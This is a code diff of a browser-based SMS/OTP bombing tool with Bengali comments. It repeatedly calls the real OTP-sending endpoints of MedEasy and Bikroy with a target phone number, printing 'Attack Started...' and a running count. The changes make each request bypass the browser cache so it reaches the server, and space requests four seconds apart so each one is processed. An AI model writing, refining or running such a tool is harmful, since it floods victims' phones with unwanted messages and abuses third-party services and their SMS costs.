@@ -35,26 +35,27 @@ async function startProcess() {
 
     display.innerText = "Attack Started...";
     
-    // আপনার চাহিদা অনুযায়ী সাজানো এপিআই লিস্ট
+    // আপনার কনফার্ম করা ১ ও ২ নম্বর এপিআই
     const apiList = [
-        `https://api.medeasy.health/api/send-otp/+88${target}/`, // ১ নম্বর: MedEasy
-        `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${target}`  // ২ নম্বর: Bikroy
+        `https://api.medeasy.health/api/send-otp/+88${target}/`,
+        `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${target}`
     ];
 
     for (let i = 1; i <= count; i++) {
         try { 
-            // পর্যায়ক্রমে ১ এবং ২ নম্বর এপিআই কল হবে
+            // ১ নম্বরটি আগে পাঠানোর জন্য লজিক (MedEasy)
             let currentApi = apiList[(i - 1) % apiList.length];
 
+            // রিকোয়েস্ট পাঠানোর সময় 'no-cache' নিশ্চিত করা হয়েছে যাতে সার্ভার বুঝতে পারে এটি নতুন রিকোয়েস্ট
             await fetch(currentApi, { 
                 method: 'GET', 
                 mode: 'no-cors',
-                cache: 'no-store'
+                cache: 'reload' // ব্রাউজার ক্যাশ ব্যবহার না করে সরাসরি সার্ভার থেকে আনবে
             }); 
 
             display.innerText = "Sent: " + i;
             
-            // আপনার ৪ সেকেন্ডের নিরাপদ বিরতি
+            // ৪ সেকেন্ডের নিরাপদ বিরতি যাতে MedEasy সার্ভার রিকোয়েস্টটি প্রসেস করতে পারে
             await new Promise(res => setTimeout(res, 4000));
         } catch (e) {
             console.log("Error skipped...");
@@ -84,7 +85,7 @@ function activateCooldown(seconds) {
     }, 1000);
 }
 
-// Matrix Background Animation
+// Matrix Background Animation (design remains same)
 const canvas = document.getElementById('matrix');
 const ctx = canvas.getContext('2d');
 canvas.width = window.innerWidth;
